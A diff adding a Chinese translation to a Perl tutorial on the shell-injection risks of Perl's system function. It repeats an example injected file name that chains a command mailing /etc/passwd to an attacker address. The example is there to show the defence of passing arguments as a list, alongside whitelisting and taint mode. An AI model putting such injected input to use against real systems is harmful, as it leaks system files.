@@ -2,8 +2,10 @@
 =timestamp 2013-06-03T22:22:22
 =indexes system
 =status show
+=original running-external-programs-from-perl
 =books beginner_book
 =author szabgab
+=translator terrencehan
 =index 1
 =archive 1
 =feed 1
@@ -182,7 +184,10 @@ but we also avoided the dangers of the shell.
 The 'checkfiles' program will probably complain that it cannot find a file called
 <hl>data*.txt; mail blackhat@perlmaven.com &lt; /etc/passwd</hl>, but at least our passwords
 will be safe.
-然后用户输入<hl>data*.txt; mail blackhat@perlmaven.com &lt; /etc/passwd</hl>。
+然后用户输入<hl>data*.txt; mail blackhat@perlmaven.com &lt; /etc/passwd</hl>，相应的perl脚本会运行
+'checkfiles'程序，并向它传递一个参数:<hl>data*.txt; mail blackhat@perlmaven.com &lt; /etc/passwd</hl>。
+此时shell不会扩展参数，也避免了shell的危险。'checkfiles'程序可能会提示找不到文件<hl>data*.txt; mail blackhat@perlmaven.com &lt; /etc/passwd</hl>，
+但至少我们的密码文件是安全的。
 
 <h2>总结和深入阅读</h2>
 
@@ -191,6 +196,9 @@ but if the input comes from an untrusted source, this can easily become an attac
 The risk can be reduced by first checking the input against a <b>white list</b> of acceptable
 input characters. You can force yourself to think about these issues by enabling the
 <b>taint mode</b> using the <hl>-T</hl> flag on the sh-bang line.
+向<hl>system</hl>传递由一个字符串构成的命令是挺方便的，但是如果输入来自一个不可信任的源就可能会很容易的招致攻击。
+这份危险可以通过首先按照一份<b>白名单</b>检查输入是否有效来规避。你也可以通过在#!行使用<hl>-T</hl>标志开启<b>taint模式</b>来强制
+自己注意这些方面。
 
 You can read more in the <a href="/perldoc/system">documentation of system</a>.
 更多内容请参阅<a href="/perldoc/system">system的文档</a>。
